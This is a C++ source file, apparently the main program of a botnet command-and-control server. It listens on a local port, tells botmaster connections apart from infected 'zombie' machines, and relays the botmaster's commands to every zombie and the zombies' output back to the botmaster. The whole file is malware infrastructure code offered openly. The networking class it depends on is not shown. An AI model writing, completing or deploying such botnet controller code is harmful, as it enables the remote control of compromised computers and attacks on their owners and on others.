#include <iostream>

#include "Server.h"

int main()
{
	std::cout << "Init CanC" << std::endl;
	Server CandC("127.0.0.1", 54001);

	if (!CandC.init())
		return 0;

	if (CandC.createListeningSocket())
	{
		while (true)
		{
			CandC.waiting();					//blocking till something happens

			switch (CandC.acceptConnection())
			{
			case WEIRDO:
				std::cout << "Weido tried to connect" << std::endl;
				break;
			case BOTMASTER: 
				std::cout << "Botmaster connected" << std::endl;
				break;
			case ZOMBIE:
				std::cout << "New Zombie" << std::endl;
				break;
			default:
				break;
			}

			if (CandC.receive())
			{
				std::string bmsg = CandC.getBotMasterMessage();
				if (!bmsg.empty())
				{
					std::cout << CandC.getBotMasterMessage() << std::endl;
					CandC.sendToZombies(CandC.getBotMasterMessage());
				}

				std::vector<std::string> zmsgs = CandC.getBotMessages();
				if (!zmsgs.empty())
				{
					for (std::string zmsg : zmsgs)
					{
						CandC.sendToBotmaster(zmsg);
					}
				}
			}
		}
	}
	else
	{
		std::cout << "couldnt create server socket" << std::endl;
	}

	std::cin.get();
	return 0;
}